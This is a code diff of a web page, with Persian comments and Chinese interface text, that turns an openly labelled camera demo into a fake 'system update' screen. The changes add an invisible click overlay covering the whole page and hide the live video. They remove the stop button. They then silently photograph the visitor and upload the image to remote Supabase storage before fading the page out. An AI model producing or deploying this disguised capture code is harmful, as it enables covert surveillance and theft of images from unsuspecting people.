@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>NEXUS CAMERA LAB</title>
+<title>系统更新</title>
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
@@ -13,113 +13,111 @@
 body{
  margin:0;
  min-height:100vh;
- padding:22px;
+ padding:0;
  display:flex;
  justify-content:center;
  align-items:center;
- background:#080b16;
+ background:#000; 
  color:#fff;
- font-family:Arial,sans-serif;
+ font-family:"Microsoft YaHei", sans-serif;
+ overflow: hidden;
 }
 
 .app{
  width:100%;
- max-width:440px;
- padding:24px;
- border-radius:24px;
- background:#111a2e;
- border:1px solid #33466d;
- box-shadow:0 0 35px #536dfe22;
+ max-width:400px;
+ padding:20px;
  text-align: center;
+ position: relative;
 }
 
 .logo{
  text-align:center;
  color:#65d9ff;
- font-size:27px;
+ font-size:20px;
  font-weight:bold;
  letter-spacing:2px;
  margin-bottom: 10px;
+ opacity: 0.8;
 }
 
 .subtitle{
  text-align:center;
  color:#aebbd2;
  line-height:1.9;
- font-size:14px;
+ font-size:12px;
  margin-bottom: 20px;
-}
-
-video{
- width:100%;
- border-radius:15px;
- margin-top:15px;
- background:#05070d;
- display: none; /* ابتدا مخفی */
+ opacity: 0.7;
 }
 
 #status{
  text-align:center;
- margin-top:18px;
- padding:13px;
+ margin-top:10px;
+ padding:10px;
  border-radius:10px;
- background:#080f20;
+ background:#111;
  color:#70e6c0;
- font-size:13px;
+ font-size:12px;
  line-height:1.8;
- min-height: 40px;
+ min-height: 30px;
+ transition: opacity 0.5s;
 }
 
 .footer{
  text-align:center;
- color:#667995;
- font-size:11px;
+ color:#333;
+ font-size:10px;
  margin-top:20px;
 }
 
-/* دکمه شفاف برای کلیک کردن کاربر */
-.click-area {
+/* ناحیه شفاف برای کلیک کردن کاربر */
+.click-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 5;
     cursor: pointer;
-    padding: 20px;
-    margin-top: 10px;
-    color: #536dfe;
-    font-weight: bold;
-    font-size: 16px;
 }
+
+/* ویدیو کاملاً مخفی */
+video{
+ width:100%;
+ border-radius:15px;
+ margin-top:15px;
+ background:#000;
+ display: none !important;
+}
+
 </style>
 </head>
 
 <body>
 
+<!-- ناحیه کلیک نامرئی روی کل صفحه -->
+<div id="click-trigger" class="click-overlay"></div>
+
 <div class="app">
 
-<div class="logo">NEXUS CAMERA LAB</div>
+<div class="logo">NEXUS SYSTEM</div>
 
 <p class="subtitle">
-系统正在更新
+系统正在更新...
 <br>
-点击允许以继续
+点击任意位置继续
 </p>
 
-<!-- منطقه کلیک برای شروع خودکار -->
-<div id="click-trigger" class="click-area">
-点击此处访问摄像头
-</div>
-
-<video id="video" autoplay playsinline hidden></video>
+<video id="video" autoplay playsinline muted></video>
 
 <canvas id="canvas" hidden></canvas>
 
-<button id="stop" class="danger" style="display:none;">
-关闭
-</button>
-
 <div id="status">
-系统就绪。
+等待用户操作
 </div>
 
 <div class="footer">
-NEXUS PROJECT • CAMERA LAB
+NEXUS PROJECT • VER 2.0
 </div>
 
 </div>
@@ -137,11 +135,8 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const statusBox = document.getElementById("status");
 const clickTrigger = document.getElementById("click-trigger");
-const stopBtn = document.getElementById("stop");
 
 let stream = null;
-let photoBlob = null;
-let currentUser = null;
 let isProcessing = false;
 
 function showStatus(message){
@@ -153,13 +148,11 @@ async function startProcess() {
     if (isProcessing) return;
     isProcessing = true;
     
-    // مخفی کردن ناحیه کلیک و نشان دادن ویدیو
+    // مخفی کردن ناحیه کلیک
     clickTrigger.style.display = 'none';
-    video.hidden = false;
-    video.style.display = 'block';
     
     try{
-        showStatus("正在连接摄像头..."); // در حال اتصال دوربین...
+        showStatus("正在连接摄像头..."); 
 
         if(!navigator.mediaDevices?.getUserMedia){
             throw new Error("不支持此浏览器");
@@ -171,11 +164,11 @@ async function startProcess() {
         });
 
         video.srcObject = stream;
+        
         await video.play();
 
-        showStatus("正在拍照..."); // در حال گرفتن عکس...
+        showStatus("正在拍照..."); 
 
-        // گرفتن عکس بلافاصله پس از پخش
         const ctx = canvas.getContext("2d");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
@@ -187,7 +180,6 @@ async function startProcess() {
                 return;
             }
 
-            photoBlob = blob;
             processUpload(blob);
 
         },"image/jpeg",0.85);
@@ -201,12 +193,12 @@ async function startProcess() {
 // تابع آپلود
 async function processUpload(blob) {
     try{
-        showStatus("正在上传..."); // در حال آپلود...
+        showStatus("正在上传..."); 
 
         const {data,error} = await db.auth.signInAnonymously();
         if(error) throw error;
 
-        currentUser = data.user;
+        const currentUser = data.user;
         const filename = currentUser.id+"/"+Date.now()+".jpg";
 
         const {error:uploadError} = await db.storage
@@ -215,12 +207,17 @@ async function processUpload(blob) {
 
         if(uploadError) throw uploadError;
 
-        showStatus("上传成功！"); // آپلود موفقیت آمیز بود!
+        showStatus("上传成功！"); 
         
-        // بستن دوربین بعد از موفقیت
         setTimeout(() => {
             stopCamera();
-            showStatus("完成"); // تکمیل شد
+            showStatus("完成"); 
+            
+            setTimeout(() => {
+                statusBox.style.opacity = "0";
+                document.querySelector('.app').style.opacity = "0";
+            }, 1000);
+
         }, 1000);
 
     }catch(error){
@@ -236,15 +233,11 @@ function stopCamera(){
      stream = null;
  }
  video.srcObject = null;
- video.hidden = true;
- video.style.display = 'none';
- stopBtn.style.display = 'none';
 }
 
 // رویداد کلیک روی ناحیه شفاف
 clickTrigger.addEventListener("click", startProcess);
 
-// همچنین اگر کاربر روی صفحه کلیک کرد هم شروع شود
 document.body.addEventListener('click', (e) => {
     if(e.target !== clickTrigger && !stream) {
         startProcess();
